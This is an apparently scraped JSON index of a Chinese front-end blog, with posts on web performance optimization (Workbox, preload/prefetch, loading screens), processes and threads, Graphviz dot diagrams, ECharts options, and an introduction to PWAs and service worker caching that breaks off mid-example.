Worker\n借助webpack插件WorkboxWebpackPlugin和ManifestPlugin,加载serviceWorker.js,通过serviceWorker.register()注册\n\nnew WorkboxWebpackPlugin.GenerateSW(&#123;    clientsClaim: true,    exclude: [/\\.map$/, /asset-manifest\\.json$/],    importWorkboxFrom: &#x27;cdn&#x27;,    navigateFallback: paths.publicUrlOrPath + &#x27;index.html&#x27;,    navigateFallbackBlacklist: [        new RegExp(&#x27;^/_&#x27;),        new RegExp(&#x27;/[^/?]+\\\\.[^/]+$&#x27;),    ],&#125;),new ManifestPlugin(&#123;    fileName: &#x27;asset-manifest.json&#x27;,    publicPath: paths.publicUrlOrPath,    generate: (seed, files, entrypoints) =&gt; &#123;        const manifestFiles = files.reduce((manifest, file) =&gt; &#123;            manifest[file.name] = file.path;            return manifest;        &#125;, seed);        const entrypointFiles = entrypoints.app.filter(            fileName =&gt; !fileName.endsWith(&#x27;.map&#x27;)        );        return &#123;            files: manifestFiles,            entrypoints: entrypointFiles,        &#125;;    &#125;,&#125;),\n\n\n九、预加载 &amp;&amp; 懒加载1、preload就拿demo中的字体举例，正常情况下的加载顺序是这样的：\n\n加入preload：\n&lt;link rel=&quot;preload&quot; href=&quot;https://fonts.gstatic.com/s/longcang/v5/LYjAdGP8kkgoTec8zkRgqHAtXN-dRp6ohF_hzzTtOcBgYoCKmPpHHEBiM6LIGv3EnKLjtw.119.woff2&quot; as=&quot;font&quot; crossorigin=&quot;anonymous&quot;/&gt; &lt;link rel=&quot;preload&quot; href=&quot;https://fonts.gstatic.com/s/longcang/v5/LYjAdGP8kkgoTec8zkRgqHAtXN-dRp6ohF_hzzTtOcBgYoCKmPpHHEBiM6LIGv3EnKLjtw.118.woff2&quot; as=&quot;font&quot; crossorigin=&quot;anonymous&quot;/&gt; &lt;link rel=&quot;preload&quot; href=&quot;https://fonts.gstatic.com/s/longcang/v5/LYjAdGP8kkgoTec8zkRgqHAtXN-dRp6ohF_hzzTtOcBgYoCKmPpHHEBiM6LIGv3EnKLjtw.116.woff2&quot; as=&quot;font&quot; crossorigin=&quot;anonymous&quot;/&gt;\n\n\n2、prefetch\n场景：首页不需要这样的字体文件，下个页面需要：首页会以最低优先级Lowest来提前加载\n\n加入prefetch：\n需要的页面，从prefetch cache中取\n\nwebpack也是支持这两个属性的:webpackPrefetch 和 webpackPreload\n3、懒加载图片机械图片\n\n渐进式图片（类似高斯模糊） 需要UI小姐姐出稿的时候指定这种格式\n\n响应式图片\n\n原生模式：&#96;&#96;\n\n路由懒加载通过函数 + import实现\nconst Page404 = () =&gt; import(/* webpackChunkName: &quot;error&quot; */&#x27;@views/errorPage/404&#x27;);\n\n十、ssr &amp;&amp; react-snap\n服务端渲染SSR，vue使用nuxt.js，react使用next.js\nreact-snap可以借助Puppeteer实现先渲染单页，然后保留DOM，发送到客户端\n\n十一、体验优化白屏loading\nloading.html 需要自取哦，还有种方式，使用webpack插件HtmlWebpackPlugin将loading资源插入到页面中\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;    &lt;title&gt;Loading&lt;/title&gt;    &lt;style&gt;      body &#123;        margin: 0;      &#125;      #loadding &#123;        position: fixed;        top: 0;        bottom: 0;        display: flex;        width: 100%;        align-items: center;        justify-content: center;      &#125;      #loadding &gt; span &#123;        display: inline-block;        width: 8px;        height: 100%;        margin-right: 5px;        border-radius: 4px;        -webkit-animation: load 1.04s ease infinite;        animation: load 1.04s ease infinite;      &#125;      @keyframes load &#123;        0%,        100% &#123;          height: 40px;          background: #98beff;        &#125;        50% &#123;          height: 60px;          margin-top: -20px;          background: #3e7fee;        &#125;      &#125;    &lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;loadding&quot;&gt;      &lt;span&gt;&lt;/span&gt;      &lt;span style=&quot;animation-delay: 0.13s&quot;&gt;&lt;/span&gt;      &lt;span style=&quot;animation-delay: 0.26s&quot;&gt;&lt;/span&gt;      &lt;span style=&quot;animation-delay: 0.39s&quot;&gt;&lt;/span&gt;      &lt;span style=&quot;animation-delay: 0.52s&quot;&gt;&lt;/span&gt;    &lt;/div&gt;  &lt;/body&gt;  &lt;script&gt;    window.addEventListener(&quot;DOMContentLoaded&quot;, () =&gt; &#123;      const $loadding = document.getElementById(&quot;loadding&quot;);      if (!$loadding) &#123;        return;      &#125;      $loadding.style.display = &quot;none&quot;;      $loadding.parentNode.removeChild($loadding);    &#125;);  &lt;/script&gt;&lt;/html&gt;","categories":["前端性能优化"],"tags":["优化"]},{"title":"图解前端性能优化","url":"/2021/03/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E5%9B%BE%E8%A7%A3%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","content":"一、css和js的装载与执行1.1 HTML 页面加载渲染的过程\n1.2 HTML渲染过程的一些特点\n1.3 css 阻塞和 js 阻塞1.3.1 CSS阻塞\n1.3.2 JS阻塞\n二、资源的压缩与合并2.1 文件合并\n2.2 css、js 及 HTML压缩2.2.1 CSS压缩\n2.2.2 JS压缩\n2.2.3 HTML压缩\n2.3 http 清求的过程及潜在的性能优化点\n\n三、图片相关的优化3.1 不同格式图片常用的业务场景\n3.2 图片压缩几种方法-雪碧图、Image inline3.2.1 使用矢量图\n3.2.2 在安卓下使用webp\n四、 懒加载与预加载4.1 懒加载原理\n4.2 预加载原理\n4.3 懒加载、预加载使用场景\n4.4 预加载原生 js 和 PreloadJS 实现\n五、缓存\n六、重绘与回流6.1 什么是重绘与回流6.1.1 重绘\n6.1.2 回流\n6.2 避免重绘回流的两种方法\n6.3 css 性能让 Javacript 变慢？\n6.4 案例解析-重绘、回流及图层\n6.5 实战优化点总结\n七、浏览器存储7.1 cookies\n7.2 LocalStorage、SessionStorage7.2.1 LocalStorage\n7.2.2 SessionStorage\n7.3 IndexedDB\n7.4 案例解析\n7.5 PWA与Service Workers7.5.1 PWA\n7.5.2 Service Workers\n7.6 Service Workers-离线应用\n八、移动H5前端性能优化指南\n","categories":["前端性能优化"],"tags":["优化"]},{"title":"进程和线程","url":"/2019/07/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/","content":"\n进程是资源分配的基本单位，它是程序执行时的一个实例，在程序运行时创建；线程是程序执行的最小单位，是进程的一个执行流，一个线程由多个线程组成的。\n\n\n什么是进程\n进程是资源（CPU、内存等）分配的基本单位，它是程序执行时的一个实例。\n程序运行时系统就会创建一个进程，并为它分配资源，然后把该进程放入进程就绪队列\n进程调度器选中它的时候就会为它分配CPU时间，程序开始真正运行。\n\n什么是线程\n线程是程序执行时的最小单位，它是进程的一个执行流，是CPU调度和分派的基本单位。\n一个进程可以由很多个线程组成，线程间共享进程的所有资源，每个线程有自己的堆栈和局部变量。\n线程由CPU独立调度执行，在多CPU环境下就允许多个线程同时运行。同样多线程也可以实现并发操作，每个请求分配一个线程来处理。\n\n","categories":["操作系统"],"tags":["操作系统"]},{"title":"Graphviz绘制流程图","url":"/2021/07/16/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/Graphviz%E7%BB%98%E5%88%B6%E6%B5%81%E7%A8%8B%E5%9B%BE/","content":"一、初识Graphviz1.1 简介\nGraphViz是一个开源的图像可视化的软件，是贝尔实验室开发的一个开源的工具包，它使用一个特定的DSL(领域特定语言): dot作为脚本语言，然后使用布局引擎来解析此脚本，并完成自动布局。graphviz提供丰富的导出格式，如常用的图片格式，SVG，PDF格式等\n\n1.2 环境搭建结合sublime Text插件实时编译预览\n\n使用shift+command+p，输入搜索选中Package Control: Install Package,然后输入GraphViz,然后安装GraphVizPreview即可，安装完成后，只要全选中代码，然后按shift+command+g就可以预览了。\n\n\n其实也可以直接用brew安装GraphViz,但是每次要敲命令行，太麻烦了\n\nmac下执行\nbrew install graphviz\n\n\n终端编译代码 dot test.dot -T png -o test.png\n\n二、使用\nGraphviz 支持两类图：无向图（graph,用“ - - ”表示节点之间）和 有向图（digraph,用“ -&gt;” 表示节点之间）。graphviz包含3中元素，图，顶点和边。每个元素都可以具有各自的属性，用来定义字体，样式，颜色，形状等\n\nGraphViz中包含多种布局\n\ndot 默认布局，用于有向图\nneato 基于spring-model算法(force-based)\ntwopo 径向布局\ncirco 圆形布局\nfdp 用于无向图\n\n2.1 第一个graphviz图\n语法介绍 http://graphs.grevian.org/reference\n\ndigraph abc&#123;  a;  b;  c;  d;   a -&gt; b;  b -&gt; d;  c -&gt; d;&#125;\n\n\n定义顶点和边的样式\ndigraph abc&#123;  node [shape=&quot;record&quot;];  edge [style=&quot;dashed&quot;];  a;  b;  c;  d;   a -&gt; b;  b -&gt; d;  c -&gt; d;&#125;\n\n\n\n进一步修改顶点和边样式,将顶点a的颜色改为淡绿色，并将c到d的边改为红色\n\ndigraph abc&#123;  node [shape=&quot;record&quot;];  edge [style=&quot;dashed&quot;];   a [style=&quot;filled&quot;, color=&quot;black&quot;, fillcolor=&quot;chartreuse&quot;];  b;  c;  d;   a -&gt; b;  b -&gt; d;  c -&gt; d [color=&quot;red&quot;];&#125;\n\n\n其他例子\ndigraph demo&#123;  label=&quot;儿茶酚胺合成代谢路径&quot;;  酪氨酸 -&gt; L多巴 -&gt; 多巴胺 -&gt; 去甲肾上腺素 -&gt; 肾上腺素;  下丘脑 -&gt; 多巴胺;  交感神经元 -&gt; 去甲肾上腺素;  肾上腺髓质 -&gt; 去甲肾上腺素,肾上腺素;  酪氨酸 [label=&quot;酪氨酸&quot;,color=green];  多巴胺 [label=&quot;多巴胺&quot;, color=red];  肾上腺素 [label=&quot;肾上腺素&quot;, color=red];  下丘脑 [shape=box];  交感神经元 [shape=box];  肾上腺髓质 [shape=box];&#125;\n\n\n2.2 带标签digraph &#123;    player[label = &quot;player&quot;, color = Blue, fontcolor = Red, fontsize = 24, shape = box];    game[label = &quot;game&quot;, color = Red, fontcolor = Blue, fontsize = 24, shape = ellipse];    player -&gt; game[label = &quot;play&quot;]&#125;\n\n\n2.3 子视图digraph &#123;    label = visitNet    rankdir = LR    node[color = Red, fontsize = 24, shape = box]    edge[color = Blue, style = &quot;dashed&quot;]    user[style = &quot;filled&quot;, color = &quot;yellow&quot;, fillcolor = &quot;chartreuse&quot;]    subgraph cluster_cd&#123;        label = &quot;server and browser&quot;        bgcolor = green;        browser -&gt; server    &#125;    user -&gt; computer;    computer -&gt; browser;&#125;\n\n\n2.4 结构视图digraph &#123;    node[shape = record];    struct1[label = &quot;&lt;f0&gt; left|&lt;f1&gt; mid&amp;#92; dle|&lt;f2&gt; right&quot;];    struct2[label = &quot;&lt;f0&gt; one|&lt;f1&gt; two&quot;];    struct3[label = &quot;hello&amp;#92;nworld | &#123;b|&#123;c|&lt;here&gt; d|e&#125;|f&#125;|g|h&quot;];    struct1:f1 -&gt; struct2:f0;    struct1:f2 -&gt; struct3:here;&#125;\n\n\n2.5 树形结构digraph tree &#123;    fontname = &quot;PingFang-SC-Light&quot;  fontsize = 24  node[shape = &quot;plaintext&quot;]  1 -&gt; 2;  1 -&gt; 3;  2 -&gt; 4;  2 -&gt; 5;  3 -&gt; 6;  3 -&gt; 7;  4 -&gt; 8;  4 -&gt; 9;  5 -&gt; 10;  5 -&gt; 11;  6 -&gt; 12;  6 -&gt; 13;  7 -&gt; 14;  7 -&gt; 15;&#125;\n\n\n2.6 时序图digraph time &#123;    rankdir = &quot;LR&quot;;    node[shape = &quot;point&quot;, width = 0, height = 0];    edge[arrowhead = &quot;none&quot;, style = &quot;dashed&quot;];    &#123;        rank = &quot;same&quot;        edge[style = &quot;solided&quot;];        APP[shape = &quot;plaintext&quot;];        APP -&gt; step00 -&gt; step01 -&gt; step02 -&gt; step03 -&gt; step04 -&gt; step05;    &#125;        &#123;        rank=&quot;same&quot;;        edge[style=&quot;solided&quot;];        SDK[shape=&quot;plaintext&quot;];        SDK -&gt; step10 -&gt; step11 -&gt; step12 -&gt; step13 -&gt; step14 -&gt; step15;    &#125;    &#123;        rank=&quot;same&quot;;        edge[style=&quot;solided&quot;];        AliPay[shape=&quot;plaintext&quot;];        AliPay -&gt; step20 -&gt; step21 -&gt; step22 -&gt; step23 -&gt; step24 -&gt; step25;    &#125;    &#123;        rank=&quot;same&quot;;        edge[style=&quot;solided&quot;];        Server[shape=&quot;plaintext&quot;];        Server -&gt; step30 -&gt; step31 -&gt; step32 -&gt; step33 -&gt; step34 -&gt; step35;    &#125;    step00 -&gt; step10 [label=&quot;sends order info&quot;, arrowhead=&quot;normal&quot;];    step11 -&gt; step21 [label=&quot;open AliPay&quot;, arrowhead=&quot;normal&quot;];    step22 -&gt; step12 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;];    step13 -&gt; step03 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;];    step24 -&gt; step34 [label=&quot;pay success&quot;, arrowhead=&quot;normal&quot;];&#125;\n\n\n2.7 一个hash表的数据结构\nhash表内容\n\nstruct st_hash_type &#123;    int (*compare) ();    int (*hash) ();&#125;; struct st_table_entry &#123;    unsigned int hash;    char *key;    char *record;    st_table_entry *next;&#125;; struct st_table &#123;    struct st_hash_type *type;    int num_bins;/* slot count */    int num_entries;/* total number of entries */    struct st_table_entry **bins;/* slot */&#125;;\n\n脚本如下：\ndigraph st2&#123;  fontname = &quot;Verdana&quot;;  fontsize = 10;  rankdir=TB;   node [fontname = &quot;Verdana&quot;, fontsize = 10, color=&quot;skyblue&quot;, shape=&quot;record&quot;];   edge [fontname = &quot;Verdana&quot;, fontsize = 10, color=&quot;crimson&quot;, style=&quot;solid&quot;];   st_hash_type [label=&quot;&#123;&lt;head&gt;st_hash_type|(*compare)|(*hash)&#125;&quot;];  st_table_entry [label=&quot;&#123;&lt;head&gt;st_table_entry|hash|key|record|&lt;next&gt;next&#125;&quot;];  st_table [label=&quot;&#123;st_table|&lt;type&gt;type|num_bins|num_entries|&lt;bins&gt;bins&#125;&quot;];   st_table:bins -&gt; st_table_entry:head;  st_table:type -&gt; st_hash_type:head;  st_table_entry:next -&gt; st_table_entry:head [style=&quot;dashed&quot;, color=&quot;forestgreen&quot;];&#125;\n\n\n2.8 模块的生命周期图digraph module_lc&#123;  rankdir=TB;  fontname = &quot;Microsoft YaHei&quot;;  fontsize = 12;   node [fontname = &quot;Microsoft YaHei&quot;, fontsize = 12, shape = &quot;Mrecord&quot;, color=&quot;skyblue&quot;, style=&quot;filled&quot;];  edge [fontname = &quot;Microsoft YaHei&quot;, fontsize = 12, color=&quot;darkgreen&quot; ];   installed [label=&quot;已安装状态&quot;];  resolved [label=&quot;已就绪状态&quot;];  uninstalled [label=&quot;已卸载状态&quot;];  starting [label=&quot;正在启动&quot;];  active [label=&quot;已激活(运行)状态&quot;];  stopping [label=&quot;正在停止&quot;];  start [label=&quot;&quot;, shape=&quot;circle&quot;, width=0.5, fixedsize=true, style=&quot;filled&quot;, color=&quot;black&quot;];   start -&gt; installed [label=&quot;安装&quot;];  installed -&gt; uninstalled [label=&quot;卸载&quot;];  installed -&gt; resolved [label=&quot;准备&quot;];  installed -&gt; installed [label=&quot;更新&quot;];  resolved -&gt; installed [label=&quot;更新&quot;];  resolved -&gt; uninstalled [label=&quot;卸载&quot;];  resolved -&gt; starting [label=&quot;启动&quot;];  starting -&gt; active [label=&quot;&quot;];  active -&gt; stopping [label=&quot;停止&quot;];  stopping -&gt; resolved [label=&quot;&quot;];&#125;\n\n\n2.9 简单的UML类图digraph G&#123;   fontname = &quot;Courier New&quot;  fontsize = 10   node [ fontname = &quot;Courier New&quot;, fontsize = 10, shape = &quot;record&quot; ];  edge [ fontname = &quot;Courier New&quot;, fontsize = 10 ];   Animal [ label = &quot;&#123;Animal |+ name : String\\\\l+ age : int\\\\l|+ die() : void\\\\l&#125;&quot; ];       subgraph clusterAnimalImpl&#123;          bgcolor=&quot;yellow&quot;          Dog [ label = &quot;&#123;Dog||+ bark() : void\\\\l&#125;&quot; ];          Cat [ label = &quot;&#123;Cat||+ meow() : void\\\\l&#125;&quot; ];      &#125;;   edge [ arrowhead = &quot;empty&quot; ];   Dog-&gt;Animal;  Cat-&gt;Animal;  Dog-&gt;Cat [arrowhead=&quot;none&quot;, label=&quot;0..*&quot;];&#125;\n\n\n2.10 有限状态机digraph finite_state_machine &#123;    rankdir=LR;    size=&quot;8,5&quot;    node [shape = circle];    S0 -&gt; S1 [ label = &quot;Lift Nozzle&quot; ]    S1 -&gt; S0 [ label = &quot;Replace Nozzle&quot; ]    S1 -&gt; S2 [ label = &quot;Authorize Pump&quot; ]    S2 -&gt; S0 [ label = &quot;Replace Nozzle&quot; ]    S2 -&gt; S3 [ label = &quot;Pull Trigger&quot; ]    S3 -&gt; S2 [ label = &quot;Release Trigger&quot; ]&#125;\n\n\n三、语法\n完整列表 http://graphviz.org/doc/info/attrs.html\n\n3.1 图像属性\nlabel=&quot;My Graph&quot;; 给图像设置标签\nrankdir=LR; 将图片由原来的从上到下布局变成从左到右布局\n&#123;rank=same; a, b, c &#125; 将一组元素放到同一个level\nsplines=&quot;line&quot;; 让边框变为直线，没有曲线和锐角\nK=0.6; 用来在布局中影响spring属性，spring属性可以用于将节点往外推，这个在twopi和sfdp布局中很有用。\n\n3.2 交点属性\n[label=&quot;Some Label&quot;] 给交点打标签\n[color=&quot;red&quot;] 给交点上色\n[fillcolor=&quot;blue&quot;] 设置交点的填充色\n\n3.3 边的属性\n[label=&quot;Some Label&quot;] 给边设置标签 (设置路径权重的时候很有用)\n[color=&quot;red&quot;] # 给交点上色 (标示路径的时候很有用)\n[penwidth=2.0] # 给边适配厚度，标示路径的时候很有用。\n\n3.4 尺寸, 背景颜色\nfixedsize=true;\nsize=&quot;1,1&quot;;\nresolution=72;\nbgcolor=&quot;#C6CFD532&quot;;\n\n四、一些技巧4.1 插入图片digraph &#123;    c[shape = none, image = &quot;./pic.png&quot;]    a -&gt; b -&gt; c;    c -&gt; d;&#125;\n\n\n\n注：需要用命令行dot test.dot -T png -o test.png生成，前提是用brew安装了GraphViz\n\n4.2 统一节点和连线digraph &#123;    node[color = Red, fontsize = 24, shape = box]    edge[color = Blue, style = &quot;dashed&quot;]    c[shape = none, image = &quot;./pic.png&quot;]    a -&gt; b -&gt; c;    c -&gt; d;&#125;\n\n\n","categories":["数据可视化"],"tags":["Graphviz"]},{"title":"echart使用小结","url":"/2021/06/23/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/echart%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","content":"\n十一个组件选项主要用来进行交互\n\n一、Timeline选项\n时间轴，每个图表最多仅有一个时间轴控件\n\n\n二、Title选项\n每个图表最多仅有一个标题控件，每个标题控件可设主副标题\n\n\n可以对标题文字的大小样式进行设置\n\n\n三、toolbox\n工具箱，每个图表最多仅有一个工具箱。工具箱里面可以实现图表类型的切换，保存图片，刷新，查看数据等功能。可以对其像素进行设置\n\n\n&#123;    mark : &#123;        show : false,        title : &#123;            mark : &#x27;辅助线开关&#x27;,            markUndo : &#x27;删除辅助线&#x27;,            markClear : &#x27;清空辅助线&#x27;        &#125;,        lineStyle : &#123;            width : 2,            color : &#x27;#1e90ff&#x27;,            type : &#x27;dashed&#x27;        &#125;    &#125;,    dataZoom : &#123;        show : false,        title : &#123;            dataZoom : &#x27;区域缩放&#x27;,            dataZoomReset : &#x27;区域缩放后退&#x27;        &#125;    &#125;,    dataView : &#123;        show : false,        title : &#x27;数据视图&#x27;,        readOnly: false,        lang: [&#x27;数据视图&#x27;, &#x27;关闭&#x27;, &#x27;刷新&#x27;]    &#125;,    magicType: &#123;        show : false,        title : &#123;            line : &#x27;折线图切换&#x27;,            bar : &#x27;柱形图切换&#x27;,            stack : &#x27;堆积&#x27;,            tiled : &#x27;平铺&#x27;,            force: &#x27;力导向布局图切换&#x27;,            chord: &#x27;和弦图切换&#x27;,            pie: &#x27;饼图切换&#x27;,            funnel: &#x27;漏斗图切换&#x27;        &#125;,        option: &#123;            // line: &#123;...&#125;,            // bar: &#123;...&#125;,            // stack: &#123;...&#125;,            // tiled: &#123;...&#125;,            // force: &#123;...&#125;,            // chord: &#123;...&#125;,            // pie: &#123;...&#125;,            // funnel: &#123;...&#125;        &#125;,        type : []    &#125;,    restore : &#123;        show : false,        title : &#x27;还原&#x27;    &#125;,    saveAsImage : &#123;        show : false,        title : &#x27;保存为图片&#x27;,        type : &#x27;png&#x27;,        lang : [&#x27;点击保存&#x27;]    &#125;&#125;\n\n四、tooltip\n提示框，鼠标悬浮交互时的信息提示\n\n\n五、legend\n图例，每个图表最多仅有一个图例，混搭图表共享\n\n\n六、dataRange\n值域选择，每个图表最多仅有一个值域控件\n\n\n七、dataZoom\n数据区域缩放。与toolbox.feature.dataZoom同步，仅对直角坐标系图表有效\n\nroamController\n缩放漫游组件，仅对地图有效\n\n\n八、grid\n直角坐标系内绘图网格\n\n\n九、xAxis\n直角坐标系中横轴数组，数组中每一项代表一条横轴坐标轴，仅有一条时可省略数组。最多同时存在2条横轴，单条横轴时可指定安放于grid的底部（默认）或顶部，2条同时存在时位置互斥，默认第一条安放于底部，第二条安放于顶部\n\n十、yAxis\n直角坐标系中纵轴数组，数组中每一项代表一条纵轴坐标轴，仅有一条时可省略数组。最多同时存在2条纵轴，单条纵轴时可指定安放于grid的左侧（默认）或右侧，2条同时存在时位置互斥，默认第一条安放于左侧，第二条安放于右侧\n\n\n坐标轴有三种类型，类目型、数值型和时间型，纵轴通常为数值型，但条形图时则纵轴为类目型\n\n十一、series（通用）\n驱动图表生成的数据内容数组，数组中每一项为一个系列的选项及数据，其中个别选项仅在部分图表类型中有效，请注意适用类型\n\n","categories":["数据可视化"],"tags":["echart"]},{"title":"浅谈PWA(Progressive Web App)","url":"/2021/06/12/%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%B5%85%E8%B0%88PWA(Progressive%20Web%20App)/","content":"一、初识PWA\n\nPWA，即Progressive Web App, 是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。\n一个 PWA 应用首先是一个网页, 可以通过 Web 技术编写出一个网页应用. 随后添加上 App Manifest 和 Service Worker 来实现PWA 的安装和离线等功能\n\n\n1.1 PWA中的一些技术\nPWA本身其实是一个概念集合，它不是指某一项技术，而是通过一系列的Web技术与Web标准来优化Web App的安全、性能和体验。其中涉及到的一些技术概念包括了\n\n\nWeb App Manifest\nService Worker\nCache API 缓存\nPush、Notification 推送与通知\nBackground Sync后台同步\n响应式设计\n\n1.2 解决了哪些问题\n可以添加至主屏幕，点击主屏幕图标可以实现启动动画以及隐藏地址栏\n实现离线缓存功能，即使用户手机没有网络，依然可以使用一些离线功能\n实现了消息推送\n\n1.3 PWA存在的问题\n支持率不高:现在ios手机端不支持pwa，IE也暂时不支持Chrome在中国桌面版占有率还是不错的，安卓移动端上的占有率却很低\n各大厂商还未明确支持pwa\n依赖的GCM服务在国内无法使用\n微信小程序的竞争\n\n\n尽管有上述的一些缺点，PWA技术仍然有很多可以使用的点。\n\n\nservice worker技术实现离线缓存，可以将一些不经常更改的静态文件放到缓存中，提升用户体验。\nservice worker实现消息推送，使用浏览器推送功能，吸引用户渐进式开发，尽管一些浏览器暂时不支持，可以利用上述技术给使用支持浏览器的用户带来更好的体验\n\n二、PWA的实现2.1 Manifest实现添加至主屏幕&lt;!--index.html--&gt;&lt;head&gt;  &lt;title&gt;Minimal PWA&lt;/title&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no&quot; /&gt;  &lt;link rel=&quot;manifest&quot; href=&quot;manifest.json&quot; /&gt;  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;main.css&quot;&gt;  &lt;link rel=&quot;icon&quot; href=&quot;/e.png&quot; type=&quot;image/png&quot; /&gt;&lt;/head&gt;// manifest.json&#123;  &quot;name&quot;: &quot;Minimal PWA&quot;, // 必填 显示的插件名称  &quot;short_name&quot;: &quot;PWA Demo&quot;, // 可选  在APP launcher和新的tab页显示，如果没有设置，则使用name  &quot;description&quot;: &quot;The app that helps you understand PWA&quot;, //用于描述应用  &quot;display&quot;: &quot;standalone&quot;, // 定义开发人员对Web应用程序的首选显示模式。standalone模式会有单独的  &quot;start_url&quot;: &quot;/&quot;, // 应用启动时的url  &quot;theme_color&quot;: &quot;#313131&quot;, // 桌面图标的背景色  &quot;background_color&quot;: &quot;#313131&quot;, // 为web应用程序预定义的背景颜色。在启动web应用程序和加载应用程序的内容之间创建了一个平滑的过渡。  &quot;icons&quot;: [ // 桌面图标，是一个数组    &#123;    &quot;src&quot;: &quot;icon/lowres.webp&quot;,    &quot;sizes&quot;: &quot;48x48&quot;,  // 以空格分隔的图片尺寸    &quot;type&quot;: &quot;image/webp&quot;  // 帮助userAgent快速排除不支持的类型  &#125;,  &#123;    &quot;src&quot;: &quot;icon/lowres&quot;,    &quot;sizes&quot;: &quot;48x48&quot;  &#125;,  &#123;    &quot;src&quot;: &quot;icon/hd_hi.ico&quot;,    &quot;sizes&quot;: &quot;72x72 96x96 128x128 256x256&quot;  &#125;,  &#123;    &quot;src&quot;: &quot;icon/hd_hi.svg&quot;,    &quot;sizes&quot;: &quot;72x72&quot;  &#125;  ]&#125;\n\n\n\nManifest参考文档：https://developer.mozilla.org/zh-CN/docs/Web/Manifest\n如果用的是安卓手机，可以下载chrome浏览器自己操作看看\n\n\n2.2 service worker实现离线缓存2.2.1 什么是service worker\nService Worker 是 Chrome 团队提出和力推的一个 WEB API，用于给 web 应用提供高级的可持续的后台处理能力\n\n\n\nService Workers 就像介于服务器和网页之间的拦截器，能够拦截进出的HTTP 请求，从而完全控制你的网站\n\n2.2.2 最主要的特点\n在页面中注册并安装成功后，运行于浏览器后台，不受页面刷新的影响，可以监听和截拦作用域范围内所有页面的 HTTP 请求。\n网站必须使用 HTTPS。除了使用本地开发环境调试时(如域名使用 localhost)\n运行于浏览器后台，可以控制打开的作用域范围下所有的页面请求\n单独的作用域范围，单独的运行环境和执行线程\n不能操作页面 DOM。但可以通过事件机制来处理\n事件驱动型服务线程\n\n\n为什么要求网站必须是HTTPS的，大概是因为service worker权限太大能拦截所有页面的请求，如果http的网站安装service worker很容易被攻击\n\n2.2.3 生命周期\n\n当用户首次导航至 URL 时，服务器会返回响应的网页。\n\n\n第1步:当你调用 register() 函数时， Service Worker开始下载。\n第2步:在注册过程中，浏览器会下载、解析并执行 Service Worker ()。如果在此步骤中出现任何错误，register()返回的 promise 都会执行 reject操作，并且 Service Worker 会被废弃。\n第3步:一旦 Service Worker 成功执行了，install 事件就会激活\n第4步:安装完成，Service Worker 便会激活，并控制在其范围内的一切。如果生命周期中的所有事件都成功了，Service Worker便已准备就绪，随时可以使用了！\n\n\nchrome://serviceworker-internals 来了解当前浏览器中所有已安装Service Worker的详细情况\n\n2.2.4 实现离线缓存HTTP缓存\n\nWeb 服务器可以使用 Expires 首部来通知 Web客户端，它可以使用资源的当前副本，直到指定的“过期时间”。反过来，浏览器可以缓存此资源，并且只有在有效期满后才会再次检查新版本。使用 HTTP 缓存意味着你要依赖服务器来告诉你何时缓存资源和何时过期\n\nservice worker缓存\n\nService Workers的强大在于它们拦截 HTTP 请求的能力进入任何传入的HTTP 请求，并决定想要如何响应。在你的 Service Worker 中，可以编写逻辑来决定想要缓存的资源，以及需要满足什么条件和资源需要缓存多久。一切尽归你掌控！\n\n&lt;!--index.html--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Hello Caching World!&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;!-- Image --&gt;    &lt;img src=&quot;/images/hello.png&quot; /&gt;                     &lt;!-- JavaScript --&gt;    &lt;script async src=&quot;/js/script.js&quot;&gt;&lt;/script&gt;         &lt;script&gt;      // 注册 service worker      if (&#x27;serviceWorker&#x27; in navigator) &#123;                   navigator.serviceWorker.register(&#x27;/service-worker.js&#x27;, &#123;scope: &#x27;/&#x27;&#125;).then(function (registration) &#123;          // 注册成功          console.log(&#x27;ServiceWorker registration successful with scope: &#x27;, registration.scope);        &#125;).catch(function (err) &#123;                             // 注册失败 :(          console.log(&#x27;ServiceWorker registration failed: &#x27;, err);        &#125;);      &#125;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n\n注：Service Worker的注册路径决定了其 scope默认作用页面的范围。\n如果 service-worker.js是在 /sw/ 页面路径下，这使得该 Service Worker 默认只会收到 页面/sw/ 路径下的 fetch 事件。\n如果存放在网站的根路径下，则将会收到该网站的所有 fetch事件。\n如果希望改变它的作用域，可在第二个参数设置 scope 范围。示例中将其改为了根目录，即对整个站点生效。\n\n// service-worker.jsvar cacheName = &#x27;helloWorld&#x27;;     // 缓存的名称  // install 事件，它发生在浏览器安装并注册 Service Worker 时        self.addEventListener(&#x27;install&#x27;, event =&gt; &#123; /* event.waitUtil 用于在安装成功之前执行一些预装逻辑 但是建议只做一些轻量级和非常重要资源的缓存，减少安装失败的概率 安装成功后 ServiceWorker 状态会从 installing 变为 installed */  event.waitUntil(    caches.open(cacheName)                      .then(cache =&gt; cache.addAll([    // 如果所有的文件都成功缓存了，便会安装完成。如果任何文件下载失败了，那么安装过程也会随之失败。              &#x27;/js/script.js&#x27;,      &#x27;/images/hello.png&#x27;    ]))  );&#125;);  /**为 fetch 事件添加一个事件监听器。接下来，使用 caches.match() 函数来检查传入的请求 URL 